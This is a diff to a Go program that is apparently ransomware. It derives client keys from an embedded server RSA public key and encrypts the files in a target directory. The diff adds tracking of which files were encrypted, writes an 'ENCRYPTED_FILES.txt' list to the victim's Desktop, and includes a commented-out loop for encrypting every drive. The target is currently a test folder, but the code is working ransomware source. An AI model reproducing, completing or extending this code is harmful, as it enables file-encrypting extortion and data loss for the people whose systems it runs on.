@@ -14,21 +14,29 @@ import (
 )
 
 var (
-	filesToVisit = make(chan io.File)
-	waitGroup    sync.WaitGroup
-	sPubKey      = io.DecodePublicKey(utils.SPubKeyPem)
+	filesToVisit  = make(chan io.File)
+	encryptedList []string
+	waitGroup     sync.WaitGroup
+	sPubKey       = io.DecodePublicKey(utils.SPubKeyPem)
 )
 
 func main() {
-
-	currentDirectory, _ := os.Getwd()
 
 	cPubKey, err := generateClientKeys(sPubKey)
 	if err != nil {
 		panic(err)
 	}
 
-	encryptFiles(string(currentDirectory+"/testFolder"), cPubKey)
+	currentDirectory, _ := os.Getwd()
+	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	encryptFiles(dir, cPubKey)
+
+	// drives := io.GetDrives()
+	// for _, drive := range drives {
+	// 	encryptFiles(drive, cPubKey)
+	// }
+
+	defer generateDesktopFiles()
 }
 
 func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
@@ -59,6 +67,7 @@ func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
 func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 
 	var ext string
+	var err error
 
 	waitGroup.Add(1)
 	go func() {
@@ -91,10 +100,28 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
-			file.Encrypt(cPubKey)
+			err = file.Encrypt(cPubKey)
+			if err == nil {
+				encryptedList = append(encryptedList, file.Path)
+			}
 		}
 		defer waitGroup.Done()
 	}()
 
 	waitGroup.Wait()
+}
+
+func generateDesktopFiles() {
+
+	var text string = "------ENCRYPTED FILES------\n\n"
+	desktopPath, err := utils.GetDesktopPath()
+	if err != nil {
+		panic(err)
+	}
+
+	for _, filePath := range encryptedList {
+		text = text + filePath + "\n"
+	}
+	bytes := []byte(text)
+	os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
 }
